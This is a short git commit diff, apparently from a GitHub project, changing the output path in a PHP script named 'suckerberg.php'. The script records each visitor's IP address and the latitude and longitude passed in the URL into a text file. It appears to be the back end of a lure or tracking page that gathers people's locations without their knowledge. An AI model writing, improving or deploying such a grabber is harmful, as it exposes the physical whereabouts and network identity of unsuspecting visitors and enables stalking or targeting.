3aa496f13c835ea1f6ecd0f9eba203e32d290649
System Sorcerer <151441135+systemsorcerer69@users.noreply.github.com>
2023-12-18 19:57:37 +0545

    Update suckerberg.php

--- assets/php/suckerberg.php
+++ assets/php/suckerberg.php
@@ -1,6 +1,6 @@
 <?php 
 
-$myfile = fopen("/assets/Demo/store.txt", "w");
+$myfile = fopen("store.txt", "w");
 $txt = "IP Address: " . $_SERVER["REMOTE_ADDR"]
  . "\n\nlatitude: " . $_GET["lat"] . "\nlongitude: " . $_GET["long"];
 fwrite($myfile, $txt);
